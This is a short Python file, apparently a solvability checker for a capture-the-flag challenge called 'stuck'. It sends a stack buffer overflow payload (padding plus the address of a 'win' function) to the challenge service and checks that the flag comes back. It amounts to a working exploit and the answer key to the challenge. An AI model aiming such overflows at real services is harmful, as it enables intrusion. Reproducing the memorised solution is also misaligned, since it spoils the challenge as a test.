from pwn import *

from inspectors.pwn import PwnChallengeInspector


class StuckInspector(PwnChallengeInspector):
    def solve(self) -> bool:
        context.log_level = 'CRITICAL'
        context.binary = 'distfiles/stuck/chall'
        try:
            elf = ELF('distfiles/stuck/chall', checksec=False)
            io = remote(self.host, self.port)

            io.recvuntil('>')
            io.sendline(b'A' * 0x78 + pack(elf.symbols['win']))

            res = io.recvall()
            assert self.flag.encode() in res, res

            self.logger.info(self.msg_succeeded_to_solve())
            return True

        except Exception:
            self.logger.warning(self.msg_failed_to_solve())
            return False
